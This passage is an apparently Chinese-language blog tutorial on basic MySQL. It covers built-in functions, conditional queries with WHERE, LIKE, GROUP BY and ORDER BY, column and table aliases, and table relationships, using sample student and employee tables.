<h4 id="2-1、时间函数"><a href="#2-1、时间函数" class="headerlink" title="2.1、时间函数"></a>2.1、时间函数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> NOW();</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DAY</span> (NOW());</span><br><span class="line"><span class="keyword">SELECT</span> <span class="type">DATE</span> (NOW());</span><br><span class="line"><span class="keyword">SELECT</span> <span class="type">TIME</span> (NOW());</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">YEAR</span> (NOW());</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">MONTH</span> (NOW());</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">CURRENT_DATE</span>();</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">CURRENT_TIME</span>();</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">CURRENT_TIMESTAMP</span>();</span><br><span class="line"><span class="keyword">SELECT</span> ADDTIME(<span class="string">&#x27;14:23:12&#x27;</span>,<span class="string">&#x27;01:02:01&#x27;</span>);</span><br><span class="line"><span class="keyword">SELECT</span> DATE_ADD(NOW(),<span class="type">INTERVAL</span> <span class="number">1</span> <span class="keyword">DAY</span>);</span><br><span class="line"><span class="keyword">SELECT</span> DATE_ADD(NOW(),<span class="type">INTERVAL</span> <span class="number">1</span> <span class="keyword">MONTH</span>);</span><br><span class="line"><span class="keyword">SELECT</span> DATE_SUB(NOW(),<span class="type">INTERVAL</span> <span class="number">1</span> <span class="keyword">DAY</span>);</span><br><span class="line"><span class="keyword">SELECT</span> DATE_SUB(NOW(),<span class="type">INTERVAL</span> <span class="number">1</span> <span class="keyword">MONTH</span>);</span><br><span class="line"><span class="keyword">SELECT</span> DATEDIFF(<span class="string">&#x27;2019-07-22&#x27;</span>,<span class="string">&#x27;2019-05-05&#x27;</span>);</span><br><span class="line"><span class="number">123456789101112131415</span>AI助手</span><br></pre></td></tr></table></figure>

<h4 id="2-2、字符串函数"><a href="#2-2、字符串函数" class="headerlink" title="2.2、字符串函数"></a>2.2、字符串函数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--连接函数</span></span><br><span class="line"><span class="keyword">SELECT</span> CONCAT ()</span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="keyword">SELECT</span> INSTR ();</span><br><span class="line"><span class="comment">--统计长度</span></span><br><span class="line"><span class="keyword">SELECT</span> LENGTH();</span><br></pre></td></tr></table></figure>

<h4 id="2-3、数学函数"><a href="#2-3、数学函数" class="headerlink" title="2.3、数学函数"></a>2.3、数学函数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 绝对值</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">ABS</span>(<span class="number">-136</span>);</span><br><span class="line"><span class="comment">-- 向下取整</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">FLOOR</span>(<span class="number">3.14</span>);</span><br><span class="line"><span class="comment">-- 向上取整</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">CEILING</span>(<span class="number">3.14</span>);</span><br><span class="line"><span class="number">123456</span>AI助手</span><br></pre></td></tr></table></figure>

<h2 id="十一、条件查询"><a href="#十一、条件查询" class="headerlink" title="十一、条件查询"></a>十一、条件查询</h2><p>数据库中存有大量数据，我们可根据需求获取指定的数据。此时，我们可在查询语句中通过WHERE子句指定查询条件对查询结果进行过滤。<br>在开始学习条件查询之前，我们先准备测试数据，代码如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 创建数据库</span></span><br><span class="line"><span class="keyword">DROP</span> DATABASE IF <span class="keyword">EXISTS</span> mydb;</span><br><span class="line"><span class="keyword">CREATE</span> DATABASE mydb;</span><br><span class="line">USE mydb;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建student表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> student (</span><br><span class="line">    sid <span class="type">CHAR</span>(<span class="number">6</span>),</span><br><span class="line">    sname <span class="type">VARCHAR</span>(<span class="number">50</span>),</span><br><span class="line">    age <span class="type">INT</span>,</span><br><span class="line">    gender <span class="type">VARCHAR</span>(<span class="number">50</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;male&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 向student表插入数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1001&#x27;</span>, <span class="string">&#x27;lili&#x27;</span>, <span class="number">14</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1002&#x27;</span>, <span class="string">&#x27;wang&#x27;</span>, <span class="number">15</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1003&#x27;</span>, <span class="string">&#x27;tywd&#x27;</span>, <span class="number">16</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1004&#x27;</span>, <span class="string">&#x27;hfgs&#x27;</span>, <span class="number">17</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1005&#x27;</span>, <span class="string">&#x27;qwer&#x27;</span>, <span class="number">18</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1006&#x27;</span>, <span class="string">&#x27;zxsd&#x27;</span>, <span class="number">19</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1007&#x27;</span>, <span class="string">&#x27;hjop&#x27;</span>, <span class="number">16</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1008&#x27;</span>, <span class="string">&#x27;tyop&#x27;</span>, <span class="number">15</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1009&#x27;</span>, <span class="string">&#x27;nhmk&#x27;</span>, <span class="number">13</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1010&#x27;</span>, <span class="string">&#x27;xdfv&#x27;</span>, <span class="number">17</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1012&#x27;</span>, <span class="string">&#x27;lili&#x27;</span>, <span class="number">14</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1013&#x27;</span>, <span class="string">&#x27;wang&#x27;</span>, <span class="number">15</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="number">1234567891011121314151617181920212223242526</span>AI助手</span><br></pre></td></tr></table></figure>

<h3 id="1-使用关系运算符查询"><a href="#1-使用关系运算符查询" class="headerlink" title="1.使用关系运算符查询"></a>1.使用关系运算符查询</h3><p>在WHERE中可使用关系运算符进行条件查询，常用的关系运算符如下所示：</p>
<table>
<thead>
<tr>
<th>关系运算符</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>&#x3D;</td>
<td>等于</td>
</tr>
<tr>
<td>&lt;&gt;</td>
<td>不等于</td>
</tr>
<tr>
<td>!&#x3D;</td>
<td>不等于</td>
</tr>
<tr>
<td>&lt;</td>
<td>小于</td>
</tr>
<tr>
<td>&lt;&#x3D;</td>
<td>小于等于</td>
</tr>
<tr>
<td>&gt;</td>
<td>大于</td>
</tr>
<tr>
<td>&gt;&#x3D;</td>
<td>大于等于</td>
</tr>
</tbody></table>
<p>查询年龄等于或大于17的学生的信息 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student <span class="keyword">where</span> age<span class="operator">&gt;=</span><span class="number">17</span>;</span><br></pre></td></tr></table></figure>

<h3 id="2-使用IN关键字查询"><a href="#2-使用IN关键字查询" class="headerlink" title="2.使用IN关键字查询"></a>2.使用IN关键字查询</h3><p>IN关键字用于判断某个字段的值是否在指定集合中。如果字段的值恰好在指定的集合中，则将字段所在的记录将査询出来。</p>
<p>查询sid为S_1002和S_1003的学生信息 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student <span class="keyword">where</span> sid <span class="keyword">in</span> (<span class="string">&#x27;S_1002&#x27;</span>,<span class="string">&#x27;S_1003&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>查询sid为S_1001以外的学生的信息 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student <span class="keyword">where</span> sid <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;S_1001&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="3-使用BETWEEN-AND关键字查询"><a href="#3-使用BETWEEN-AND关键字查询" class="headerlink" title="3.使用BETWEEN AND关键字查询"></a>3.使用BETWEEN AND关键字查询</h3><p>BETWEEN AND用于判断某个字段的值是否在指定的范围之内。如果字段的值在指定范围内，则将所在的记录将查询出来<br>查询15到18岁的学生信息 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student <span class="keyword">where</span> age <span class="keyword">between</span> <span class="number">15</span> <span class="keyword">and</span> <span class="number">18</span>;</span><br></pre></td></tr></table></figure>

<p>查询不是15到18岁的学生信息 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student <span class="keyword">where</span> age <span class="keyword">not</span> <span class="keyword">between</span> <span class="number">15</span> <span class="keyword">and</span> <span class="number">18</span>;</span><br></pre></td></tr></table></figure>

<h3 id="4-使用空值查询"><a href="#4-使用空值查询" class="headerlink" title="4.使用空值查询"></a>4.使用空值查询</h3><p>在MySQL中，使用 IS NULL关键字判断字段的值是否为空值。请注意：空值NULL不同于0，也不同于空字符串<br><strong>由于student表没有空值就不演示查询空值的了</strong><br>查询sname不为空值的学生信息 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student <span class="keyword">where</span> sname <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure>

<h3 id="5-使用AND关键字查询"><a href="#5-使用AND关键字查询" class="headerlink" title="5.使用AND关键字查询"></a>5.使用AND关键字查询</h3><p>在MySQL中可使用AND关键字可以连接两个或者多个查询条件。<br>查询年纪大于15且性别为male的学生信息 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student <span class="keyword">where</span> age<span class="operator">&gt;</span><span class="number">15</span> <span class="keyword">and</span> gender<span class="operator">=</span><span class="string">&#x27;male&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="6-使用OR关键字查询"><a href="#6-使用OR关键字查询" class="headerlink" title="6.使用OR关键字查询"></a>6.使用OR关键字查询</h3><p>在使用SELECT语句查询数据时可使用OR关键字连接多个査询条件。在使用OR关键字时，只要记录满足其中任意一个条件就会被查询出来<br>查询年纪大于15或者性别为male的学生信息 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student <span class="keyword">where</span> age<span class="operator">&gt;</span><span class="number">15</span> <span class="keyword">or</span> gender<span class="operator">=</span><span class="string">&#x27;male&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="7-使用LIKE关键字查询"><a href="#7-使用LIKE关键字查询" class="headerlink" title="7.使用LIKE关键字查询"></a>7.使用LIKE关键字查询</h3><p>MySQL中可使用LIKE关键字可以判断两个字符串是否相匹配</p>
<h4 id="7-1-普通字符串"><a href="#7-1-普通字符串" class="headerlink" title="7.1 普通字符串"></a>7.1 普通字符串</h4><p>查询sname中与wang匹配的学生信息 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student <span class="keyword">where</span> sname <span class="keyword">like</span> <span class="string">&#x27;wang&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h4 id="7-2-含有-通配的字符串"><a href="#7-2-含有-通配的字符串" class="headerlink" title="7.2 含有%通配的字符串"></a>7.2 含有%通配的字符串</h4><p>%用于匹配任意长度的字符串。例如，字符串“a%”匹配以字符a开始任意长度的字符串<br>查询学生姓名以li开始的记录 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student <span class="keyword">where</span> sname <span class="keyword">like</span> <span class="string">&#x27;li%&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>查询学生姓名以g结尾的记录 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student <span class="keyword">where</span> sname <span class="keyword">like</span> <span class="string">&#x27;%g&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>查询学生姓名包含s的记录 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student <span class="keyword">where</span> sname <span class="keyword">like</span> <span class="string">&#x27;%s%&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h4 id="7-3-含有-通配的字符串"><a href="#7-3-含有-通配的字符串" class="headerlink" title="7.3 含有_通配的字符串"></a>7.3 含有_通配的字符串</h4><p>下划线通配符只匹配单个字符，如果要匹配多个字符，需要连续使用多个下划线通配符。例如，字符串“ab_”匹配以字符串“ab”开始长度为3的字符串，如abc、abp等等；字符串“a__d”匹配在字符“a”和“d”之间包含两个字符的字符串，如”abcd”、”atud”等等。<br>查询学生姓名以zx开头且长度为4的记录 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student <span class="keyword">where</span> sname <span class="keyword">like</span> <span class="string">&#x27;zx__&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>查询学生姓名以g结尾且长度为4的记录 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student <span class="keyword">where</span> sname <span class="keyword">like</span> <span class="string">&#x27;___g&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="8-使用LIMIT限制查询结果的数量"><a href="#8-使用LIMIT限制查询结果的数量" class="headerlink" title="8.使用LIMIT限制查询结果的数量"></a>8.使用LIMIT限制查询结果的数量</h3><p>当执行查询数据时可能会返回很多条记录，而用户需要的数据可能只是其中的一条或者几条<br>查询学生表中年纪最小的3位同学 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student <span class="keyword">order</span> <span class="keyword">by</span> age <span class="keyword">asc</span> limit <span class="number">3</span>;</span><br></pre></td></tr></table></figure>

<h3 id="9-使用GROUP-BY进行分组查询"><a href="#9-使用GROUP-BY进行分组查询" class="headerlink" title="9.使用GROUP BY进行分组查询"></a>9.使用GROUP BY进行分组查询</h3><p>GROUP BY 子句可像切蛋糕一样将表中的数据进行分组，再进行查询等操作。换言之，可通俗地理解为：通过GROUP BY将原来的表拆分成了几张小表。<br>接下来，我们通过一个例子开始学习GROUP BY，代码如下</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 创建数据库</span></span><br><span class="line"><span class="keyword">DROP</span> DATABASE IF <span class="keyword">EXISTS</span> mydb;</span><br><span class="line"><span class="keyword">CREATE</span> DATABASE mydb;</span><br><span class="line">USE mydb;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建员工表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> employee (</span><br><span class="line">    id <span class="type">int</span>,</span><br><span class="line">    name <span class="type">varchar</span>(<span class="number">50</span>),</span><br><span class="line">    salary <span class="type">int</span>,</span><br><span class="line">    departmentnumber <span class="type">int</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 向员工表中插入数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">&#x27;tome&#x27;</span>,<span class="number">2000</span>,<span class="number">1001</span>); </span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">values</span>(<span class="number">2</span>,<span class="string">&#x27;lucy&#x27;</span>,<span class="number">9000</span>,<span class="number">1002</span>); </span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">values</span>(<span class="number">3</span>,<span class="string">&#x27;joke&#x27;</span>,<span class="number">5000</span>,<span class="number">1003</span>); </span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">values</span>(<span class="number">4</span>,<span class="string">&#x27;wang&#x27;</span>,<span class="number">3000</span>,<span class="number">1004</span>); </span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">values</span>(<span class="number">5</span>,<span class="string">&#x27;chen&#x27;</span>,<span class="number">3000</span>,<span class="number">1001</span>); </span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">values</span>(<span class="number">6</span>,<span class="string">&#x27;yukt&#x27;</span>,<span class="number">7000</span>,<span class="number">1002</span>); </span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">values</span>(<span class="number">7</span>,<span class="string">&#x27;rett&#x27;</span>,<span class="number">6000</span>,<span class="number">1003</span>); </span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">values</span>(<span class="number">8</span>,<span class="string">&#x27;mujk&#x27;</span>,<span class="number">4000</span>,<span class="number">1004</span>); </span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">values</span>(<span class="number">9</span>,<span class="string">&#x27;poik&#x27;</span>,<span class="number">3000</span>,<span class="number">1001</span>);</span><br></pre></td></tr></table></figure>

<h4 id="9-1-GROUP-BY和聚合函数一起使用"><a href="#9-1-GROUP-BY和聚合函数一起使用" class="headerlink" title="9.1 GROUP BY和聚合函数一起使用"></a>9.1 GROUP BY和聚合函数一起使用</h4><p>统计各部门员工个数 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>), departmentnumber <span class="keyword">from</span> employee <span class="keyword">group</span> <span class="keyword">by</span> departmentnumber;</span><br></pre></td></tr></table></figure>

<p>统计部门编号大于1001的各部门员工个数 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>), departmentnumber <span class="keyword">from</span> employee <span class="keyword">where</span> departmentnumber<span class="operator">&gt;</span><span class="number">1001</span> <span class="keyword">group</span> <span class="keyword">by</span> departmentnumber;</span><br></pre></td></tr></table></figure>

<h4 id="9-2-GROUP-BY和聚合函数以及HAVING一起使用"><a href="#9-2-GROUP-BY和聚合函数以及HAVING一起使用" class="headerlink" title="9.2 GROUP BY和聚合函数以及HAVING一起使用"></a>9.2 GROUP BY和聚合函数以及HAVING一起使用</h4><p>统计工资总和大于8000的部门 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(salary),departmentnumber <span class="keyword">from</span> employee <span class="keyword">group</span> <span class="keyword">by</span> departmentnumber <span class="keyword">having</span> <span class="built_in">sum</span>(salary)<span class="operator">&gt;</span><span class="number">8000</span>;</span><br></pre></td></tr></table></figure>

<h3 id="10-使用ORDER-BY对查询结果排序"><a href="#10-使用ORDER-BY对查询结果排序" class="headerlink" title="10.使用ORDER BY对查询结果排序"></a>10.使用ORDER BY对查询结果排序</h3><p>从表中査询出来的数据可能是无序的或者其排列顺序不是我们期望的。为此，我们可以使用ORDER BY对查询结果进行排序<br>其语法格式如下所示：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 字段名<span class="number">1</span>,字段名<span class="number">2</span>,…</span><br><span class="line"><span class="keyword">FROM</span> 表名</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> 字段名<span class="number">1</span> [<span class="keyword">ASC</span> 丨 <span class="keyword">DESC</span>],字段名<span class="number">2</span> [<span class="keyword">ASC</span> <span class="operator">|</span> <span class="keyword">DESC</span>];</span><br></pre></td></tr></table></figure>

<p>在该语法中：字段名1、字段名2是查询结果排序的依据；参数 ASC表示按照升序排序，DESC表示按照降序排序；默认情况下，按照ASC方式排序。通常情况下，ORDER BY子句位于整个SELECT语句的末尾。<br>查询所有学生并按照年纪大小升序排列 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student <span class="keyword">order</span> <span class="keyword">by</span> age <span class="keyword">asc</span>;</span><br></pre></td></tr></table></figure>

<p>查询所有学生并按照年纪大小降序排列 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student <span class="keyword">order</span> <span class="keyword">by</span> age <span class="keyword">desc</span>;</span><br></pre></td></tr></table></figure>

<h2 id="十二、别名设置"><a href="#十二、别名设置" class="headerlink" title="十二、别名设置"></a>十二、别名设置</h2><p>在査询数据时可为表和字段取別名，该别名代替表和字段的原名参与查询操作。<br><strong>操作的表事先已准备</strong></p>
<h3 id="1-为表取别名"><a href="#1-为表取别名" class="headerlink" title="1.为表取别名"></a>1.为表取别名</h3><p>在查询操作时，假若表名很长使用起来就不太方便，此时可为表取一个別名，用该别名来代替表的名称。语法格式如下所示：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> 表名 [<span class="keyword">AS</span>] 表的别名 <span class="keyword">WHERE</span> .... ;</span><br></pre></td></tr></table></figure>

<p>将student改为stu查询整表 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student <span class="keyword">as</span> stu;</span><br></pre></td></tr></table></figure>

<h3 id="2-为字段取别名"><a href="#2-为字段取别名" class="headerlink" title="2.为字段取别名"></a>2.为字段取别名</h3><p>在查询操作时，假若字段名很长使用起来就不太方便，此时可该字段取一个別名，用该别名来代替字段的名称。语法格式如下所示：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 字段名<span class="number">1</span> [<span class="keyword">AS</span>] 别名<span class="number">1</span> , 字段名<span class="number">2</span> [<span class="keyword">AS</span>] 别名<span class="number">2</span> , ... <span class="keyword">FROM</span> 表名 <span class="keyword">WHERE</span> ... ;</span><br></pre></td></tr></table></figure>

<p>将student中的name取别名为“姓名” 查询整表 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> name <span class="keyword">as</span> <span class="string">&#x27;姓名&#x27;</span>,id <span class="keyword">from</span> student;</span><br></pre></td></tr></table></figure>

<h2 id="十三、表的关联关系"><a href="#十三、表的关联关系" class="headerlink" title="十三、表的关联关系"></a>十三、表的关联关系</h2><p>在实际开发中数据表之间存在着各种关联关系。在此，介绍MySQL中数据表的三种关联关系。<br><strong>多对一</strong><br>多对一(亦称为一对多)是数据表中最常见的一种关系。例如：员工与部门之间的关系，一个部门可以有多个员工；而一个员工不能属于多个部门只属于某个部门。在多对一的表关系 中，应将外键建在多的一方否则会造成数据的冗余。<br><strong>多对多</strong><br>多对多是数据表中常见的一种关系。例如：学生与老师之间的关系，一个学生可以有多个老师而且一个老师有多个学生。通常情况下，为了实现这种关系需要定义一张中间表(亦称为连接表)该表会存在两个外键分别参照老师表和学生表。<br><strong>一对一</strong><br>在开发过程中，一对一的关联关系在数据库中并不常见；因为以这种方式存储的信息通常会放在同一张表中。<br>接下来，我们来学习在一对多的关联关系中如果添加和删除数据。先准备一些测试数据，代码如下：</p>
